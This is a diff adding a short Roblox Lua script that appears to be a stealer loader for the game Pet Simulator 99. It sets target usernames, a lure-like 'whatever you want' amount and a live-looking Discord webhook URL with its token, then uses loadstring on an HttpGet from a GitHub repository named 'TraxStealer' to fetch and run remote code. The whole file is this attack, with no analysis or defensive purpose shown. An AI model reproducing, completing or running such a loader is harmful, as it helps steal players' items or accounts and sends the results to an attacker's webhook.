@@ -1,0 +1,6 @@
+Username = "dead_ceus01"
+Username2 = "dead_ceus01"
+Whatever you want = 100000
+Webhook = "https://discord.com/api/webhooks/1351603503889387664/HXA0fQRAWEwD7EBaLmN9aE4tW9ceEl5mtmzu4zPBv_-f6iFxizZEr_gai1jS0w5510Ay"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
